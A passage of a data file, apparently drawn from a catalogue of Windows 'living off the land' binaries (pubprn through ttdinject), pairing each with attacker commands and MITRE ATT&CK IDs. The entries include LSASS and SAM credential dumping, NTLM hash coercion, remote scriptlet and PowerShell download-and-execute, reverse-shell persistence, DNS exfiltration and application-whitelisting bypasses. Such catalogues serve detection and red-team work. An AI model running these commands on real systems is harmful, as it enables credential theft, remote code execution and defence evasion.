    commands: [{"cmd": "pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}", "desc": "Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection", "usecase": "Proxy execution", "category": "Execute", "mitre": "T1216.001", "privileges": "User"}]
  },
  "query": {
    name: "Query.exe",
    description: "Remote Desktop Services MultiUser Query Utility",
    path: ["c:\\windows\\system32\\query.exe", "c:\\windows\\syswow64\\query.exe"],
    commands: [{"cmd": "query.exe user", "desc": "Once executed, `query.exe` will execute `quser.exe` in the same folder. Thus, if `query.exe` is copied to a folder and an arbitrary executable is renamed to `quser.exe`, `query.exe` will spawn it. Instead of `user`, it is also possible to use `session`, `termsession` or `process` as command-line option.", "usecase": "Execute an arbitrary executable via trusted system executable.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "rasautou": {
    name: "Rasautou.exe",
    description: "Windows Remote Access Dialer",
    path: ["C:\\Windows\\System32\\rasautou.exe"],
    commands: [{"cmd": "rasautou -d {PATH:.dll} -p export_name -a a -e e", "desc": "Loads the target .DLL specified in -d and executes the export specified in -p. Options removed in Windows 10.", "usecase": "Execute DLL code", "category": "Execute", "mitre": "T1218", "privileges": "User, Administrator in Windows 8"}]
  },
  "rcsi": {
    name: "rcsi.exe",
    description: "Non-Interactive command line inerface included with Visual Studio.",
    path: ["no default"],
    commands: [{"cmd": "rcsi.exe {PATH:.csx}", "desc": "Use embedded C# within the csx script to execute the code.", "usecase": "Local execution of arbitrary C# code stored in local CSX file.", "category": "Execute", "mitre": "T1127", "privileges": "User"}, {"cmd": "rcsi.exe {PATH:.csx}", "desc": "Use embedded C# within the csx script to execute the code.", "usecase": "Local execution of arbitrary C# code stored in local CSX file.", "category": "AWL Bypass", "mitre": "T1127", "privileges": "User"}]
  },
  "rdrleakdiag": {
    name: "rdrleakdiag.exe",
    description: "Microsoft Windows resource leak diagnostic tool",
    path: ["c:\\windows\\system32\\rdrleakdiag.exe", "c:\\Windows\\SysWOW64\\rdrleakdiag.exe"],
    commands: [{"cmd": "rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1", "desc": "Dump process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).", "usecase": "Dump process by PID.", "category": "Dump", "mitre": "T1003", "privileges": "User"}, {"cmd": "rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1", "desc": "Dump LSASS process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).", "usecase": "Dump LSASS process.", "category": "Dump", "mitre": "T1003.001", "privileges": "Administrator"}, {"cmd": "rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap", "desc": "After dumping a process using `/wait 1`, subsequent dumps must use `/snap` (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).", "usecase": "Dump LSASS process mutliple times.", "category": "Dump", "mitre": "T1003.001", "privileges": "Administrator"}]
  },
  "reg": {
    name: "Reg.exe",
    description: "Used to manipulate the registry",
    path: ["C:\\Windows\\System32\\reg.exe", "C:\\Windows\\SysWOW64\\reg.exe"],
    commands: [{"cmd": "reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg {PATH_ABSOLUTE}:evilreg.reg", "desc": "Export the target Registry key and save it to the specified .REG file within an Alternate data stream.", "usecase": "Hide/plant registry information in Alternate data stream for later use", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "reg save HKLM\\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\\SAM {PATH_ABSOLUTE:.3.bak}", "desc": "Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material", "usecase": "Dump credentials from the Security Account Manager (SAM)", "category": "Credentials", "mitre": "T1003.002", "privileges": "Administrator"}]
  },
  "regasm": {
    name: "Regasm.exe",
    description: "Part of .NET",
    path: ["C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\regasm.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\regasm.exe", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe"],
    commands: [{"cmd": "regasm.exe {PATH:.dll}", "desc": "Loads the target .NET DLL file and executes the RegisterClass function.", "usecase": "Execute code and bypass Application whitelisting", "category": "AWL Bypass", "mitre": "T1218.009", "privileges": "Local Admin"}, {"cmd": "regasm.exe /U {PATH:.dll}", "desc": "Loads the target .DLL file and executes the UnRegisterClass function.", "usecase": "Execute code and bypass Application whitelisting", "category": "Execute", "mitre": "T1218.009", "privileges": "User"}]
  },
  "regedit": {
    name: "Regedit.exe",
    description: "Used by Windows to manipulate registry",
    path: ["C:\\Windows\\regedit.exe"],
    commands: [{"cmd": "regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey", "desc": "Export the target Registry key to the specified .REG file.", "usecase": "Hide registry data in alternate data stream", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "regedit {PATH_ABSOLUTE}:regfile.reg", "desc": "Import the target .REG file into the Registry.", "usecase": "Import hidden registry data from alternate data stream", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}]
  },
  "regini": {
    name: "Regini.exe",
    description: "Used to manipulate the registry",
    path: ["C:\\Windows\\System32\\regini.exe", "C:\\Windows\\SysWOW64\\regini.exe"],
    commands: [{"cmd": "regini.exe {PATH}:hidden.ini", "desc": "Write registry keys from data inside the Alternate data stream.", "usecase": "Write to registry", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}]
  },
  "register-cimprovider": {
    name: "Register-cimprovider.exe",
    description: "Used to register new wmi providers",
    path: ["C:\\Windows\\System32\\Register-cimprovider.exe", "C:\\Windows\\SysWOW64\\Register-cimprovider.exe"],
    commands: [{"cmd": "Register-cimprovider -path {PATH_ABSOLUTE:.dll}", "desc": "Load the target .DLL.", "usecase": "Execute code within dll file", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "regsvcs": {
    name: "Regsvcs.exe",
    description: "Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies",
    path: ["C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\RegSvcs.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe", "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\RegSvcs.exe", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe"],
    commands: [{"cmd": "regsvcs.exe {PATH:.dll}", "desc": "Loads the target .NET DLL file and executes the RegisterClass function.", "usecase": "Execute dll file and bypass Application whitelisting", "category": "Execute", "mitre": "T1218.009", "privileges": "User"}, {"cmd": "regsvcs.exe {PATH:.dll}", "desc": "Loads the target .NET DLL file and executes the RegisterClass function.", "usecase": "Execute dll file and bypass Application whitelisting", "category": "AWL Bypass", "mitre": "T1218.009", "privileges": "Local Admin"}]
  },
  "regsvr32": {
    name: "Regsvr32.exe",
    description: "Used by Windows to register dlls",
    path: ["C:\\Windows\\System32\\regsvr32.exe", "C:\\Windows\\SysWOW64\\regsvr32.exe"],
    commands: [{"cmd": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll", "desc": "Execute the specified remote .SCT script with scrobj.dll.", "usecase": "Execute code from remote scriptlet, bypass Application whitelisting", "category": "AWL Bypass", "mitre": "T1218.010", "privileges": "User"}, {"cmd": "regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll", "desc": "Execute the specified local .SCT script with scrobj.dll.", "usecase": "Execute code from scriptlet, bypass Application whitelisting", "category": "AWL Bypass", "mitre": "T1218.010", "privileges": "User"}, {"cmd": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll", "desc": "Execute the specified remote .SCT script with scrobj.dll.", "usecase": "Execute code from remote scriptlet, bypass Application whitelisting", "category": "Execute", "mitre": "T1218.010", "privileges": "User"}, {"cmd": "regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll", "desc": "Execute the specified local .SCT script with scrobj.dll.", "usecase": "Execute code from scriptlet, bypass Application whitelisting", "category": "Execute", "mitre": "T1218.010", "privileges": "User"}, {"cmd": "regsvr32.exe /s {PATH:.dll}", "desc": "Execute code in a DLL. The code must be inside the exported function `DllRegisterServer`.", "usecase": "Execute DLL file", "category": "Execute", "mitre": "T1218.010", "privileges": "User"}, {"cmd": "regsvr32.exe /u /s {PATH:.dll}", "desc": "Execute code in a DLL. The code must be inside the exported function `DllUnRegisterServer`.", "usecase": "Execute DLL file", "category": "Execute", "mitre": "T1218.010", "privileges": "User"}]
  },
  "remote": {
    name: "Remote.exe",
    description: "Debugging tool included with Windows Debugging Tools",
    path: ["C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\remote.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\remote.exe"],
    commands: [{"cmd": "Remote.exe /s {PATH:.exe} anythinghere", "desc": "Spawns specified executable as a child process of remote.exe", "usecase": "Executes a process under a trusted Microsoft signed binary", "category": "AWL Bypass", "mitre": "T1127", "privileges": "User"}, {"cmd": "Remote.exe /s {PATH:.exe} anythinghere", "desc": "Spawns specified executable as a child process of remote.exe", "usecase": "Executes a process under a trusted Microsoft signed binary", "category": "Execute", "mitre": "T1127", "privileges": "User"}, {"cmd": "Remote.exe /s {PATH_SMB:.exe} anythinghere", "desc": "Run a remote file", "usecase": "Executing a remote binary without saving file to disk", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "replace": {
    name: "Replace.exe",
    description: "Used to replace file with another file",
    path: ["C:\\Windows\\System32\\replace.exe", "C:\\Windows\\SysWOW64\\replace.exe"],
    commands: [{"cmd": "replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A", "desc": "Copy .cab file to destination", "usecase": "Copy files", "category": "Copy", "mitre": "T1105", "privileges": "User"}, {"cmd": "replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A", "desc": "Download/Copy executable to specified folder", "usecase": "Download file", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "reset": {
    name: "Reset.exe",
    description: "Remote Desktop Services Reset Utility",
    path: ["c:\\windows\\system32\\reset.exe", "c:\\windows\\syswow64\\reset.exe"],
    commands: [{"cmd": "reset.exe session", "desc": "Once executed, `reset.exe` will execute `rwinsta.exe` in the same folder. Thus, if `reset.exe` is copied to a folder and an arbitrary executable is renamed to `rwinsta.exe`, `reset.exe` will spawn it.", "usecase": "Execute an arbitrary executable via trusted system executable.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "rpcping": {
    name: "Rpcping.exe",
    description: "Used to verify rpc connection",
    path: ["C:\\Windows\\System32\\rpcping.exe", "C:\\Windows\\SysWOW64\\rpcping.exe"],
    commands: [{"cmd": "rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM", "desc": "Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.", "usecase": "Capture credentials on a non-standard port", "category": "Credentials", "mitre": "T1003", "privileges": "User"}, {"cmd": "rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM", "desc": "Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set).", "usecase": "Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port", "category": "Credentials", "mitre": "T1187", "privileges": "User"}]
  },
  "rundll32": {
    name: "Rundll32.exe",
    description: "Used by Windows to execute dll files",
    path: ["C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\SysWOW64\\rundll32.exe"],
    commands: [{"cmd": "rundll32.exe {PATH},EntryPoint", "desc": "First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute.", "usecase": "Execute DLL file", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}, {"cmd": "rundll32.exe {PATH_SMB:.dll},EntryPoint", "desc": "Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute.", "usecase": "Execute DLL from SMB share.", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}, {"cmd": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:{REMOTEURL}\")", "desc": "Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.", "usecase": "Execute code from Internet", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}, {"cmd": "rundll32 \"{PATH}:ADSDLL.dll\",DllMain", "desc": "Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).", "usecase": "Execute code from alternate data stream", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "rundll32.exe -sta {CLSID}", "desc": "Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID.", "usecase": "Execute a DLL/EXE COM server payload or ScriptletURL code.", "category": "Execute", "mitre": "T1218.011", "privileges": "User"}]
  },
  "runexehelper": {
    name: "Runexehelper.exe",
    description: "Launcher process",
    path: ["c:\\windows\\system32\\runexehelper.exe"],
    commands: [{"cmd": "runexehelper.exe {PATH_ABSOLUTE:.exe}", "desc": "Launches the specified exe. Prerequisites: (1) diagtrack_action_output environment variable must be set to an existing, writable folder; (2) runexewithargs_output.txt file cannot exist in the folder indicated by the variable.", "usecase": "Executes arbitrary code", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "runonce": {
    name: "Runonce.exe",
    description: "Executes a Run Once Task that has been configured in the registry",
    path: ["C:\\Windows\\System32\\runonce.exe", "C:\\Windows\\SysWOW64\\runonce.exe"],
    commands: [{"cmd": "Runonce.exe /AlternateShellStartup", "desc": "Executes a Run Once Task that has been configured in the registry.", "usecase": "Persistence, bypassing defensive counter measures", "category": "Execute", "mitre": "T1218", "privileges": "Administrator"}]
  },
  "runscripthelper": {
    name: "Runscripthelper.exe",
    description: "Execute target PowerShell script",
    path: ["C:\\Windows\\WinSxS\\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.15_none_c2df1bba78111118\\Runscripthelper.exe", "C:\\Windows\\WinSxS\\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.192_none_ad4699b571e00c4a\\Runscripthelper.exe"],
    commands: [{"cmd": "runscripthelper.exe surfacecheck \\\\?\\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder}", "desc": "Execute the PowerShell script with .txt extension", "usecase": "Bypass constrained language mode and execute Powershell script", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "sc": {
    name: "Sc.exe",
    description: "Used by Windows to manage services",
    path: ["C:\\Windows\\System32\\sc.exe", "C:\\Windows\\SysWOW64\\sc.exe"],
    commands: [{"cmd": "sc create evilservice binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" DisplayName= \"evilservice\" start= auto\\ & sc start evilservice", "desc": "Creates a new service and executes the file stored in the ADS.", "usecase": "Execute binary file hidden inside an alternate data stream", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "sc config {ExistingServiceName} binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" & sc start {ExistingServiceName}", "desc": "Modifies an existing service and executes the file stored in the ADS.", "usecase": "Execute binary file hidden inside an alternate data stream", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}]
  },
  "schtasks": {
    name: "Schtasks.exe",
    description: "Schedule periodic tasks",
    path: ["c:\\windows\\system32\\schtasks.exe", "c:\\windows\\syswow64\\schtasks.exe"],
    commands: [{"cmd": "schtasks /create /sc minute /mo 1 /tn \"Reverse shell\" /tr \"{CMD}\"", "desc": "Create a recurring task to execute every minute.", "usecase": "Create a recurring task to keep reverse shell session(s) alive", "category": "Execute", "mitre": "T1053.005", "privileges": "User"}, {"cmd": "schtasks /create /s targetmachine /tn \"MyTask\" /tr \"{CMD}\" /sc daily", "desc": "Create a scheduled task on a remote computer for persistence/lateral movement", "usecase": "Create a remote task to run daily relative to the the time of creation", "category": "Execute", "mitre": "T1053.005", "privileges": "Administrator"}]
  },
  "scriptrunner": {
    name: "Scriptrunner.exe",
    description: "Execute binary through proxy binary to evade defensive counter measures",
    path: ["C:\\Windows\\System32\\scriptrunner.exe", "C:\\Windows\\SysWOW64\\scriptrunner.exe"],
    commands: [{"cmd": "Scriptrunner.exe -appvscript {PATH:.exe}", "desc": "Executes executable", "usecase": "Execute binary through proxy binary to evade defensive counter measures", "category": "Execute", "mitre": "T1202", "privileges": "User"}, {"cmd": "ScriptRunner.exe -appvscript {PATH_SMB:.cmd}", "desc": "Executes cmd file from remote server", "usecase": "Execute binary through proxy binary from external server to evade defensive counter measures", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "setres": {
    name: "Setres.exe",
    description: "Configures display settings",
    path: ["c:\\windows\\system32\\setres.exe"],
    commands: [{"cmd": "setres.exe -w 800 -h 600", "desc": "Sets the resolution and then launches 'choice' command from the working directory.", "usecase": "Executes arbitrary code", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "settingsynchost": {
    name: "SettingSyncHost.exe",
    description: "Host Process for Setting Synchronization",
    path: ["C:\\Windows\\System32\\SettingSyncHost.exe", "C:\\Windows\\SysWOW64\\SettingSyncHost.exe"],
    commands: [{"cmd": "SettingSyncHost -LoadAndRunDiagScript {PATH:.exe}", "desc": "Execute file specified in %COMSPEC%", "usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat}", "desc": "Execute a batch script in the background (no window ever pops up) which can be subverted to running arbitrary programs by setting the current working directory to %TMP% and creating files such as reg.bat/reg.exe in that directory thereby causing them to execute instead of the ones in C:\\Windows\\System32.", "usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism. Additionally, effectively act as a -WindowStyle Hidden option (as there is in PowerShell) for any arbitrary batch file.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "sftp": {
    name: "Sftp.exe",
    description: "sftp.exe is a Windows command-line utility that uses the Secure File Transfer Protocol (SFTP) to securely transfer files between a local machine and a remote server.",
    path: ["C:\\Windows\\System32\\OpenSSH\\sftp.exe"],
    commands: [{"cmd": "sftp -o ProxyCommand=\"{CMD}\" .", "desc": "Spawns ssh.exe which in turn spawns the specified command line. See also this project's entry for ssh.exe.", "usecase": "Proxy execution of specified command, can be used as a defensive evasion.", "category": "Execute", "mitre": "T1202", "privileges": "User"}]
  },
  "sigverif": {
    name: "Sigverif.exe",
    description: "File Signature Verification utility to verify digital signatures of files",
    path: ["C:\\Windows\\System32\\sigverif.exe", "C:\\Windows\\SysWOW64\\sigverif.exe"],
    commands: [{"cmd": "sigverif.exe", "desc": "Launch sigverif.exe GUI, click 'Advanced', specify arbitrary executable path as 'log file name', then click 'View Log' to execute the binary.", "usecase": "Execute arbitrary programs through a trusted Microsoft-signed binary to bypass application whitelisting.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "sqldumper": {
    name: "Sqldumper.exe",
    description: "Debugging utility included with Microsoft SQL.",
    path: ["C:\\Program Files\\Microsoft SQL Server\\90\\Shared\\SQLDumper.exe", "C:\\Program Files (x86)\\Microsoft Office\\root\\vfs\\ProgramFilesX86\\Microsoft Analysis\\AS OLEDB\\140\\SQLDumper.exe", "C:\\Program Files\\Microsoft Power BI Desktop\\bin\\SqlDumper.exe"],
    commands: [{"cmd": "sqldumper.exe 464 0 0x0110", "desc": "Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp).", "usecase": "Dump process using PID.", "category": "Dump", "mitre": "T1003", "privileges": "Administrator"}, {"cmd": "sqldumper.exe 540 0 0x01100:40", "desc": "0x01100:40 flag will create a Mimikatz compatible dump file.", "usecase": "Dump LSASS.exe to Mimikatz compatible dump using PID.", "category": "Dump", "mitre": "T1003.001", "privileges": "Administrator"}]
  },
  "sqlps": {
    name: "Sqlps.exe",
    description: "Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\\100 and 110 are Powershell v2. Microsoft SQL Server\\120 and 130 are Powershell version 4. Replaced by SQLToolsPS.exe in SQL Server 2016, but will be included with installation for compatability reasons.",
    path: ["C:\\Program files (x86)\\Microsoft SQL Server\\100\\Tools\\Binn\\sqlps.exe", "C:\\Program files (x86)\\Microsoft SQL Server\\110\\Tools\\Binn\\sqlps.exe", "C:\\Program files (x86)\\Microsoft SQL Server\\120\\Tools\\Binn\\sqlps.exe", "C:\\Program files (x86)\\Microsoft SQL Server\\130\\Tools\\Binn\\sqlps.exe", "C:\\Program Files (x86)\\Microsoft SQL Server\\150\\Tools\\Binn\\SQLPS.exe"],
    commands: [{"cmd": "Sqlps.exe -noprofile", "desc": "Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.", "usecase": "Execute PowerShell commands without ScriptBlock logging.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "sqltoolsps": {
    name: "SQLToolsPS.exe",
    description: "Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in SQL Server 2016+.",
    path: ["C:\\Program files (x86)\\Microsoft SQL Server\\130\\Tools\\Binn\\sqlps.exe"],
    commands: [{"cmd": "SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe}", "desc": "Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.", "usecase": "Execute PowerShell command.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "squirrel": {
    name: "Squirrel.exe",
    description: "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.",
    path: ["C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\current\\Squirrel.exe"],
    commands: [{"cmd": "squirrel.exe --download {REMOTEURL}", "desc": "The above binary will go to url and look for RELEASES file and download the nuget package.", "usecase": "Download binary", "category": "Download", "mitre": "T1218", "privileges": "User"}, {"cmd": "squirrel.exe --update {REMOTEURL}", "desc": "The above binary will go to url and look for RELEASES file, download and install the nuget package.", "usecase": "Download and execute binary", "category": "AWL Bypass", "mitre": "T1218", "privileges": "User"}, {"cmd": "squirrel.exe --update {REMOTEURL}", "desc": "The above binary will go to url and look for RELEASES file, download and install the nuget package.", "usecase": "Download and execute binary", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "squirrel.exe --updateRollback={REMOTEURL}", "desc": "The above binary will go to url and look for RELEASES file, download and install the nuget package.", "usecase": "Download and execute binary", "category": "AWL Bypass", "mitre": "T1218", "privileges": "User"}, {"cmd": "squirrel.exe --updateRollback={REMOTEURL}", "desc": "The above binary will go to url and look for RELEASES file, download and install the nuget package.", "usecase": "Download and execute binary", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "ssh": {
    name: "ssh.exe",
    description: "Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.",
    path: ["c:\\windows\\system32\\OpenSSH\\ssh.exe"],
    commands: [{"cmd": "ssh localhost \"{CMD}\"", "desc": "Executes specified command on host machine. The prompt for password can be eliminated by adding the host's public key in the user's authorized_keys file. Adversaries can do the same for execution on remote machines.", "usecase": "Execute specified command, can be used for defense evasion.", "category": "Execute", "mitre": "T1202", "privileges": "User"}, {"cmd": "ssh -o ProxyCommand=\"{CMD}\" .", "desc": "Executes specified command from ssh.exe", "usecase": "Performs execution of specified file, can be used as a defensive evasion.", "category": "Execute", "mitre": "T1202", "privileges": "User"}]
  },
  "stordiag": {
    name: "Stordiag.exe",
    description: "Storage diagnostic tool",
    path: ["c:\\windows\\system32\\stordiag.exe", "c:\\windows\\syswow64\\stordiag.exe"],
    commands: [{"cmd": "stordiag.exe", "desc": "Once executed, Stordiag.exe will execute schtasks.exe systeminfo.exe and fltmc.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it.", "usecase": "Possible defence evasion purposes.", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "stordiag.exe", "desc": "Once executed, Stordiag.exe will execute schtasks.exe and powershell.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it.", "usecase": "Possible defence evasion purposes.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "syncappvpublishingserver": {
    name: "SyncAppvPublishingServer.exe",
    description: "Used by App-v to get App-v server lists",
    path: ["C:\\Windows\\System32\\SyncAppvPublishingServer.exe", "C:\\Windows\\SysWOW64\\SyncAppvPublishingServer.exe", "C:\\Windows\\System32\\SyncAppvPublishingServer.vbs"],
    commands: [{"cmd": "SyncAppvPublishingServer.exe \"n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\"", "desc": "Example command on how inject Powershell code into the process", "usecase": "Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "SyncAppvPublishingServer.vbs \"n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\"", "desc": "Inject PowerShell script code with the provided arguments", "usecase": "Use Powershell host invoked from vbs script", "category": "Execute", "mitre": "T1216.002", "privileges": "User"}]
  },
  "tar": {
    name: "Tar.exe",
    description: "Used by Windows to extract and create archives.",
    path: ["C:\\Windows\\System32\\tar.exe", "C:\\Windows\\SysWOW64\\tar.exe"],
    commands: [{"cmd": "tar -cf {PATH}:ads {PATH_ABSOLUTE:folder}", "desc": "Compress one or more files to an alternate data stream (ADS).", "usecase": "Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "tar -xf {PATH}:ads", "desc": "Decompress a compressed file from an alternate data stream (ADS).", "usecase": "Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "tar -xf {PATH_SMB:.tar}", "desc": "Extracts archive.tar from the remote (internal) host to the current host.", "usecase": "Copy files", "category": "Copy", "mitre": "T1105", "privileges": "User"}]
  },
  "te": {
    name: "te.exe",
    description: "Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).",
    path: ["no default"],
    commands: [{"cmd": "te.exe {PATH:.wsc}", "desc": "Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file.", "usecase": "Execute Visual Basic script stored in local Windows Script Component file.", "category": "Execute", "mitre": "T1127", "privileges": "User"}, {"cmd": "te.exe {PATH:.dll}", "desc": "Execute commands from a DLL file with Test Authoring and Execution Framework (TAEF) tests. See resources section for required structures.", "usecase": "Execute DLL file.", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "teams": {
    name: "Teams.exe",
    description: "Electron runtime binary which runs the Teams application",
    path: ["C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"],
    commands: [{"cmd": "teams.exe", "desc": "Generate JavaScript payload and package.json, and save to \"%LOCALAPPDATA%\\\\Microsoft\\\\Teams\\\\current\\\\app\\\\\" before executing.", "usecase": "Execute JavaScript code", "category": "Execute", "mitre": "T1218.015", "privileges": "User"}, {"cmd": "teams.exe", "desc": "Generate JavaScript payload and package.json, archive in ASAR file and save to \"%LOCALAPPDATA%\\\\Microsoft\\\\Teams\\\\current\\\\app.asar\" before executing.", "usecase": "Execute JavaScript code", "category": "Execute", "mitre": "T1218.015", "privileges": "User"}, {"cmd": "teams.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"", "desc": "Teams spawns cmd.exe as a child process of teams.exe and executes the ping command", "usecase": "Executes a process under a trusted Microsoft signed binary", "category": "Execute", "mitre": "T1218.015", "privileges": "User"}]
  },
  "testwindowremoteagent": {
    name: "TestWindowRemoteAgent.exe",
    description: "TestWindowRemoteAgent.exe is the command-line tool to establish RPC",
    path: ["C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TestWindow\\RemoteAgent\\TestWindowRemoteAgent.exe"],
    commands: [{"cmd": "TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000", "desc": "Sends DNS query for open connection to any host, enabling exfiltration over DNS", "usecase": "Attackers may utilize this to exfiltrate data over DNS", "category": "Upload", "mitre": "T1048", "privileges": "User"}]
  },
  "tracker": {
    name: "Tracker.exe",
    description: "Tool included with Microsoft .Net Framework.",
    path: ["no default"],
    commands: [{"cmd": "Tracker.exe /d {PATH:.dll} /c C:\\Windows\\write.exe", "desc": "Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.", "usecase": "Injection of locally stored DLL file into target process.", "category": "Execute", "mitre": "T1127", "privileges": "User"}, {"cmd": "Tracker.exe /d {PATH:.dll} /c C:\\Windows\\write.exe", "desc": "Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.", "usecase": "Injection of locally stored DLL file into target process.", "category": "AWL Bypass", "mitre": "T1127", "privileges": "User"}]
  },
  "ttdinject": {
    name: "Ttdinject.exe",
    description: "Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe)",
    path: ["C:\\Windows\\System32\\ttdinject.exe", "C:\\Windows\\Syswow64\\ttdinject.exe"],
